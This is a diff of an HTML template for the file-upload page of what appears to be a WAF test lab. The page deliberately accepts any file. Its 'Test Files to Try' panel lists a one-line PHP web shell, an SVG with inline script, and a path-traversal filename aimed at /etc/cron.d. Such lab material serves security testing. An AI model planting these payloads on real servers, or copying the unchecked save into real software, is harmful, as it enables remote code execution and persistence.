@@ -1,86 +1,171 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-    <title>File Upload</title>
-
-    <link rel="stylesheet" href="/static/style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>File Upload — WAF Test Lab</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600&family=Geist+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/static/style.css">
 </head>
 
 <body>
 
-    <div class="nav">
-        <div class="nav-brand" onclick="location.href='/vuln/'" style="cursor:pointer;">
-            <div class="nav-brand-dot"></div>
-            Vulnerability Lab
-        </div>
+  <!-- NAV -->
+  <nav class="nav">
+    <div class="nav-brand" onclick="location.href='/vuln/'" style="cursor:pointer;">
+      <div class="nav-brand-dot"></div>
+      Vulnerability Lab
+    </div>
+    <div class="nav-links">
+      <a href="/vuln/sqli"   class="nav-link">SQLi</a>
+      <a href="/vuln/xss"    class="nav-link">XSS</a>
+      <a href="/vuln/upload" class="nav-link active">Upload</a>
+      <a href="/vuln/cmdi"   class="nav-link">CMDi</a>
+      <a href="/vuln/admin"  class="nav-link">Admin</a>
+      <a href="/vuln/ssrf"   class="nav-link">SSRF</a>
+    </div>
+  </nav>
+
+  <!-- PAGE -->
+  <main class="page">
+
+    <div class="page-header">
+      <a href="/vuln/" class="back-link">← Back to Dashboard</a>
+      <div class="header-meta">
+        <span class="tag tag-high">High</span>
+        <span class="tag tag-owasp">OWASP A05 — Security Misconfiguration</span>
+      </div>
+      <h1 class="page-title">Unrestricted File Upload</h1>
+      <p class="page-desc">
+        Files are accepted without any content-type, MIME, or extension validation and saved directly to the
+        server filesystem. Upload any file type including web shells, executables, and scripts.
+      </p>
     </div>
 
-    <div class="test-page">
+    <!-- LEFT -->
+    <div class="col-left">
 
-        <!-- LEFT -->
-        <div class="col">
+      <div class="panel">
+        <div class="panel-header">Upload File</div>
+        <div class="panel-body">
+          <form method="POST" enctype="multipart/form-data" id="uploadForm">
 
-            <!-- UPLOAD FORM -->
-            <form method="POST" enctype="multipart/form-data" class="panel">
-                <div class="panel-header">Upload File</div>
-                <div class="panel-body">
-                    <input type="file" name="file"><br><br>
-                    <button class="btn btn-primary">Upload</button>
-                </div>
-            </form>
+            <label class="file-upload-area" for="file-input" id="dropArea">
+              <input type="file" name="file" id="file-input" />
+              <div class="file-upload-icon">📁</div>
+              <div class="file-upload-text">Choose a file to upload</div>
+              <div class="file-upload-hint">No validation — any file type accepted</div>
+              <div class="file-upload-name" id="file-name">No file chosen</div>
+            </label>
 
-            <!-- RESULT -->
-            {% if message %}
-            <div class="panel">
-                <div class="panel-header">Result</div>
-                <div class="panel-body">
-                    <p>{{ message }}</p>
-                    <p><b>File:</b> {{ uploaded_file }}</p>
-                </div>
-            </div>
-            {% endif %}
-
+            <br>
+            <button class="btn btn-primary" type="submit">Upload File</button>
+          </form>
         </div>
+      </div>
 
-        <!-- RIGHT -->
-        <div class="col">
-
-            <div class="panel">
-                <div class="panel-header">🔥 Test Files</div>
-                <div class="panel-body">
-
-                    <div class="payload">
-                        test.php
-                    </div>
-
-                    <div class="payload">
-                        shell.jsp
-                    </div>
-
-                    <div class="payload">
-                        image.jpg (with script)
-                    </div>
-
-                    <div class="payload">
-                        malware.exe
-                    </div>
-
-                </div>
-            </div>
-
-            <div class="panel">
-                <div class="panel-header">⚠️ Note</div>
-                <div class="panel-body">
-                    <p>No file validation is applied.</p>
-                    <p>Try uploading any file type.</p>
-                </div>
-            </div>
-
+      {% if message %}
+      <div class="upload-result">
+        <div class="upload-result-bar">✓ &nbsp; Uploaded Successfully</div>
+        <div class="upload-result-body">
+          <div class="upload-result-row">
+            <span class="upload-result-key">Filename</span>
+            <span class="upload-result-val">{{ uploaded_file }}</span>
+          </div>
+          <div class="upload-result-row">
+            <span class="upload-result-key">Status</span>
+            <span class="upload-result-val">{{ message }}</span>
+          </div>
         </div>
+      </div>
+      {% endif %}
+
+      <div class="note-box">
+        <strong>Why this is vulnerable —</strong> The server calls:
+        <code>file.save(f"uploads/{filename}")</code>
+        with no checks on extension, MIME type, or filename sanitization.
+        A WAF should block uploads of executable file types and malicious
+        content-type headers.
+      </div>
 
     </div>
+
+    <!-- RIGHT -->
+    <div class="col-right">
+
+      <div class="info-panel orange">
+        <span class="info-panel-label">Attack Vectors</span>
+        <div class="info-panel-title">What can be uploaded?</div>
+        <div class="info-panel-desc">
+          Without validation, an attacker can upload web shells, executables, scripts,
+          or files with path-traversal filenames to write anywhere on the filesystem.
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-header">Test Files to Try</div>
+        <div class="panel-body" style="display:flex;flex-direction:column;gap:0.75rem;">
+
+          <div class="payload-item">
+            <div class="payload-meta">
+              <span class="payload-name">PHP webshell</span>
+              <span class="payload-effect">Remote code execution if server runs PHP</span>
+            </div>
+            <div class="payload-code-row">
+              <span class="payload-code">shell.php — &lt;?php system($_GET['cmd']); ?&gt;</span>
+            </div>
+          </div>
+
+          <div class="payload-item">
+            <div class="payload-meta">
+              <span class="payload-name">Malicious executable</span>
+              <span class="payload-effect">Binary upload accepted without restriction</span>
+            </div>
+            <div class="payload-code-row">
+              <span class="payload-code">malware.exe</span>
+            </div>
+          </div>
+
+          <div class="payload-item">
+            <div class="payload-meta">
+              <span class="payload-name">SVG with XSS</span>
+              <span class="payload-effect">Inline script in image file</span>
+            </div>
+            <div class="payload-code-row">
+              <span class="payload-code">evil.svg — &lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</span>
+            </div>
+          </div>
+
+          <div class="payload-item">
+            <div class="payload-meta">
+              <span class="payload-name">Path traversal filename</span>
+              <span class="payload-effect">Write to arbitrary filesystem path</span>
+            </div>
+            <div class="payload-code-row">
+              <span class="payload-code">../../etc/cron.d/backdoor</span>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+
+  </main>
+
+  <footer class="footer">
+    <span class="footer-left">WAF Test Lab — File Upload Module</span>
+    <span class="footer-right">For security testing only</span>
+  </footer>
+
+  <script>
+    document.getElementById('file-input').addEventListener('change', function () {
+      const name = this.files[0] ? this.files[0].name : 'No file chosen';
+      document.getElementById('file-name').textContent = name;
+    });
+  </script>
 
 </body>
-
 </html>
